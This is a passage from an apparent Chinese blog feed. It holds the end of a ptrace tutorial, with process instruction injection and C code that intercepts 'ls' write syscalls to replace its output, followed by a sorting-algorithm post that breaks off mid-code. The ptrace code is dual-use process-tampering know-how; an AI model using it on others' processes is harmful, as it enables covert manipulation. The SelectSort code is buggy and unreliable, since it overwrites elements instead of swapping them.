<p>函数freespaceaddr的主要功能就是查找空闲的内存，具体就不分析了。</p>
<p>执行测试测试程序如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~/code/ptrace<span class="preprocessor"># ./test</span></span><br><span class="line">pid=<span class="number">31166</span></span><br><span class="line">My counter: <span class="number">0</span> </span><br><span class="line">My counter: <span class="number">1</span> </span><br><span class="line">My counter: <span class="number">2</span> </span><br><span class="line">My counter: <span class="number">3</span> </span><br><span class="line">My counter: <span class="number">4</span> </span><br><span class="line">Hello World</span><br><span class="line">My counter: <span class="number">5</span> </span><br><span class="line">My counter: <span class="number">6</span> </span><br><span class="line">My counter: <span class="number">7</span> </span><br><span class="line">My counter: <span class="number">8</span> </span><br><span class="line">My counter: <span class="number">9</span></span><br></pre></td></tr></table></figure>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/code/ptrace<span class="comment"># ./ptrace3 31166</span></span><br><span class="line">The process stopped, Putting <span class="keyword">back</span> <span class="keyword">the</span> original instructions Letting <span class="keyword">it</span> <span class="keyword">continue</span> <span class="keyword">with</span> original flow</span><br></pre></td></tr></table></figure>
<p>由上面的结果可以看出我们已将一段指令代码插入到了目标进程中。</p>
<blockquote>
<p>注：VSDS(Virtual Dynamically-lined Shared Object)，这是一个由内核提供的虚拟.so文件，它不在磁盘上，而在内核里，由内核将其映射到一个地址空间中，被所有的程序共享</p>
</blockquote>
<h2 id="玩转系统调用">玩转系统调用</h2><p>第一个例子中我们可以窥视了一个进程的系统调用号。</p>
<p>那我们可以过滤我们希望的进程调用，然后干一些好玩的事。例如我们对某一进程的<code>write</code>系统调用感兴趣。</p>
<p>首先，我们了解<code>write</code>函数<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ssize_t <span class="title">write</span><span class="params">(<span class="keyword">int</span> handle, <span class="keyword">void</span> *buf, <span class="keyword">int</span> nbyte)</span></span>;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>handle 是文件描述符；<br>buf 是指定的缓冲区，即指针，指向一段内存单元；<br>nbyte 是要写入文件指定的字节数；<br>返回值：写入文档的字节数（成功）；-1（出错）</p>
</blockquote>
<p>我们在当前工作目录下，通过<code>strace ls</code>命令可以得到</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">...</span><br><span class="line">write(<span class="number">1</span>, <span class="string">"ptrace1    ptrace2    ptrace3\t p"</span>..., <span class="number">47pt</span>race1    ptrace2    ptrace3	 ptrace4    test</span><br><span class="line">) = <span class="number">47</span></span><br><span class="line">write(<span class="number">1</span>, <span class="string">"ptrace1.c  ptrace2.c  ptrace3.c "</span>..., <span class="number">51pt</span>race1<span class="class">.c</span>  ptrace2<span class="class">.c</span>  ptrace3<span class="class">.c</span>  ptrace4<span class="class">.c</span>  test<span class="class">.c</span></span><br><span class="line">) = <span class="number">51</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>我们直接看下<code>ls</code>命令的结果：</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/code/ptrace# ls</span><br><span class="line">ptrace1    ptrace2    ptrace3    ptrace4    test</span><br><span class="line">ptrace1.<span class="built_in">c</span>  ptrace2.<span class="built_in">c</span>  ptrace3.<span class="built_in">c</span>  ptrace4.<span class="built_in">c</span>  test.<span class="built_in">c</span></span><br></pre></td></tr></table></figure>
<p>然后，我们知道一个系统掉用时传参会依次存放在<code>EBX、ECX、EDX</code>而系统调用号会保存在EAX寄存器中，所以我们可以先获取EAX中的值，过滤出我们感兴趣的系统调用，这里我们过滤<code>SYS_write</code>系统调用，然后通过<code>EAX、EBX、ECX</code>中的值来改变传入参数…</p>
<p>我们依然创建一个子进程执行ls命令，然后过滤<code>ls</code>的<code>write</code>系统调用，改变其参数。。。<br>测测试代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;asm/ptrace-abi.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(pid_t child, <span class="keyword">long</span> addr,</span><br><span class="line">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span><br><span class="line"></span>&#123;   <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u &#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA,</span><br><span class="line">                          child, addr + i * <span class="number">4</span>,</span><br><span class="line">                          <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, long_size);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA,</span><br><span class="line">                          child, addr + i * <span class="number">4</span>,</span><br><span class="line">                          <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr, data.chars, j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(pid_t child, <span class="keyword">long</span> addr,</span><br><span class="line">             <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span><br><span class="line"></span>&#123;   <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u &#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child,</span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child,</span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">   <span class="keyword">pid_t</span> child;</span><br><span class="line">   child = fork();</span><br><span class="line">   <span class="keyword">if</span>(child == <span class="number">0</span>) &#123;</span><br><span class="line">      ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      execl(<span class="string">"/bin/ls"</span>, <span class="string">"ls"</span>, <span class="literal">NULL</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">long</span> orig_eax;</span><br><span class="line">      <span class="keyword">long</span> params[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">int</span> status;</span><br><span class="line">      <span class="keyword">char</span> *str, *laddr;</span><br><span class="line">      <span class="keyword">int</span> toggle = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">         wait(&amp;status);</span><br><span class="line">         <span class="keyword">if</span>(WIFEXITED(status))</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         orig_eax = ptrace(PTRACE_PEEKUSER,</span><br><span class="line">                           child, <span class="number">4</span> * ORIG_EAX,</span><br><span class="line">                           <span class="literal">NULL</span>);</span><br><span class="line">         <span class="keyword">if</span>(orig_eax == SYS_write) &#123; <span class="comment">//过滤出SYS_write系统调用</span></span><br><span class="line">            <span class="keyword">if</span>(toggle == <span class="number">0</span>) &#123;</span><br><span class="line">               toggle = <span class="number">1</span>;</span><br><span class="line">               params[<span class="number">0</span>] = ptrace(PTRACE_PEEKUSER,</span><br><span class="line">                                  child, <span class="number">4</span> * EBX,</span><br><span class="line">                                  <span class="literal">NULL</span>);</span><br><span class="line">               params[<span class="number">1</span>] = ptrace(PTRACE_PEEKUSER,</span><br><span class="line">                                  child, <span class="number">4</span> * ECX,</span><br><span class="line">                                  <span class="literal">NULL</span>);</span><br><span class="line">               params[<span class="number">2</span>] = ptrace(PTRACE_PEEKUSER,</span><br><span class="line">                                  child, <span class="number">4</span> * EDX,</span><br><span class="line">                                  <span class="literal">NULL</span>);</span><br><span class="line">               str = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((params[<span class="number">2</span>]+<span class="number">1</span>)</span><br><span class="line">                                 * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">               getdata(child, params[<span class="number">1</span>], str,</span><br><span class="line">                       params[<span class="number">2</span>]);</span><br><span class="line">               <span class="comment">//printf("para 0:%d\n",params[0]);</span></span><br><span class="line">               <span class="comment">//printf("para 1:%x\n",params[1]);</span></span><br><span class="line">               <span class="comment">//printf("para 2:%d\n",params[2]);</span></span><br><span class="line">               <span class="comment">//printf("length of str:%d %s\n",strlen(str),str);</span></span><br><span class="line">               <span class="keyword">char</span> *hi_str = <span class="string">"Hi,Monkee here!\t                                     "</span>;</span><br><span class="line">               <span class="built_in">strncpy</span>(str,hi_str,<span class="built_in">strlen</span>(hi_str)+<span class="number">1</span>);</span><br><span class="line">               putdata(child, params[<span class="number">1</span>], str,<span class="built_in">strlen</span>(hi_str)+<span class="number">1</span>);</span><br><span class="line">               <span class="comment">//ptrace(PTRACE_POKEUSER, child, 4*EDX, params[2]);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">               toggle = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./<span class="function_or_atom">ptrace4</span> </span><br><span class="line"><span class="variable">Hi</span>,<span class="variable">Monkee</span> <span class="function_or_atom">here</span><span class="exclamation_mark">!</span>	                               <span class="variable">Hi</span>,<span class="variable">Monkee</span> <span class="function_or_atom">here</span><span class="exclamation_mark">!</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到，我们用<code>Hi,Monkee here!</code>替换了正常输出。</p>
<h2 id="参考">参考</h2><blockquote>
<ul>
<li><a href="http://www.linuxjournal.com/article/6100?page=0,0" target="_blank" rel="external">play with ptrace, part I</a></li>
<li><a href="http://www.linuxjournal.com/article/6210?page=0,0" target="_blank" rel="external">play with ptrace, part II</a></li>
<li><a href="http://www.cnblogs.com/catch/p/3476280.html" target="_blank" rel="external">[译] 玩转ptrace (一)</a></li>
<li><a href="http://blog.csdn.net/wlp600/article/details/6886162" target="_blank" rel="external">vsds</a></li>
</ul>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="patrace简介">patrace简介</h2><p>使用过Linux系统多多少少会接触方便我们查看执行的程序的系统调用的strace命令或者编程时使用gdb进行程序调试。他们幕后原理工作其实就是ptrace完成的。</p>
<p>我们通过<code>man p]]>
    </summary>
    
      <category term="Hacking_Linux" scheme="http://m0nkee.github.io/tags/Hacking-Linux/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[排序算法及其比较]]></title>
    <link href="http://m0nkee.github.io/2015/08/18/sort-algorithm/"/>
    <id>http://m0nkee.github.io/2015/08/18/sort-algorithm/</id>
    <published>2015-08-18T12:26:40.000Z</published>
    <updated>2015-09-03T04:18:23.303Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这里以从小到大排序为例</p>
</blockquote>
<h2 id="冒泡排序">冒泡排序</h2><p>steps：</p>
<blockquote>
<ol>
<li>比较相邻的元素，将较大的交换到右边</li>
<li>从0~n-1重复相同的工作，n-1次比较后最大数冒到了最右边(即n-1的位置)</li>
<li>同理将第二大数冒泡到n-2位，以此类推就完成了冒泡排序</li>
</ol>
</blockquote>
<p>动态演示：<br><img src="https://upload.wikimedia.org/wikipedia/commons/3/37/Bubble_sort_animation.gif" alt=""></p>
<p>c代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> tmp;</span><br><span class="line">	tmp = *a;</span><br><span class="line">	*a = *b;</span><br><span class="line">	*b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*冒泡排序*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;n-i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[j-<span class="number">1</span>] &gt; a[j])</span><br><span class="line">			&#123;</span><br><span class="line">				Swap(&amp;a[j-<span class="number">1</span>],&amp;a[j]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>两种优化方案 </p>
<ul>
<li>某次遍历若无数据交换，则说明已排序好了，无序进行接下来的操作了。   </li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort2</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,k;</span><br><span class="line">	<span class="keyword">bool</span> flag;</span><br><span class="line"></span><br><span class="line">	k =n;</span><br><span class="line">	flag = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span>(flag)</span><br><span class="line">	&#123;</span><br><span class="line">		flag = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;k;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[i-<span class="number">1</span>] &gt; a[i])</span><br><span class="line">			&#123;</span><br><span class="line">				Swap(&amp;a[i-<span class="number">1</span>],&amp;a[i]);</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		k--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>记录某次遍历最后发生交换的位置，这个位置之后的数据已经排序好了，无序再排。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort3</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,k;</span><br><span class="line">	<span class="keyword">int</span> flag;</span><br><span class="line"></span><br><span class="line">	flag = n;</span><br><span class="line">	<span class="keyword">while</span>(flag &gt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		k = flag;</span><br><span class="line">		flag = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;k;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[i-<span class="number">1</span>] &gt; a[i])</span><br><span class="line">			&#123;</span><br><span class="line">				Swap(&amp;a[i-<span class="number">1</span>],&amp;a[i]);</span><br><span class="line">				flag = i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="选择排序">选择排序</h2><p>steps</p>
<blockquote>
<ol>
<li>在未排序的序列中找到最小的元素，存放到未排序序列的起始位置</li>
<li>接下来对剩下未排序的队列进行step1操作</li>
<li>以此类推，直到所有元素排序完毕</li>
</ol>
</blockquote>
<p>动态演示：<br><img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Selection_sort_animation.gif" alt=""></p>
<p>c代码：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/*选择排序*/</span><br><span class="line">void SelectSort(<span class="built_in">int</span> a[],<span class="built_in">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">int</span> i,j,<span class="built_in">min</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span><span class="comment">;i&lt;n;i++)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">min</span> = a[i]<span class="comment">;</span></span><br><span class="line">		<span class="keyword">for</span> (j=i<span class="comment">;j&lt;n;j++)</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[j]&lt;<span class="built_in">min</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">min</span> = a[j]<span class="comment">;</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		a[i] = <span class="built_in">min</span><span class="comment">;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="插入排序">插入排序</h2><p>排序演示：<br><img src="http://wuchong.me/img/Insertion-sort-example-300px.gif" alt="insertsort"></p>
<p>c代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*插入排序*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j=i-<span class="number">1</span>;j&gt;=<span class="number">0</span> &amp;&amp; a[j]&gt;a[j+<span class="number">1</span>];j--)</span><br><span class="line">		&#123;</span><br><span class="line">			Swap(&amp;a[j],&amp;a[j+<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="希尔排序">希尔排序</h2><p>也称递减增量排序算法，实质是分组插入排序。<br><a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F#.E6.AD.A5.E9.95.BF.E5.BA.8F.E5.88.97" target="_blank" rel="external">wikipedia上的解释</a><br>演示图<br><img src="https://upload.wikimedia.org/wikipedia/commons/d/d8/Sorting_shellsort_anim.gif" alt=""></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*希尔排序*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,gap;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (gap=n/<span class="number">2</span>;gap&gt;<span class="number">0</span>;gap/=<span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (i=gap;i&lt;n;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (j=i-gap;j&gt;=<span class="number">0</span> &amp;&amp; a[j]&gt;a[j+gap];j-=gap)</span><br><span class="line">			&#123;</span><br><span class="line">				Swap(&amp;a[j],&amp;a[j+gap]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="归并排序">归并排序</h2><p>该算法采用分治法的一个非常经典的引用，且各层分治递归可以同时进行。</p>
<p>归并排序演示：<br><img src="http://wuchong.me/img/Merge-sort-example-300px.gif" alt=""></p>
<p>总体思想：先分再和</p>
<p>c代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将有二个有序数列a[first...mid]和a[mid+1...last]合并。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergearray</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> first, <span class="keyword">int</span> mid, <span class="keyword">int</span> last, <span class="keyword">int</span> temp[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = first, j = mid + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> m = mid,   n = last;</span><br><span class="line">	<span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (i &lt;= m &amp;&amp; j &lt;= n)</span><br><span class="line">	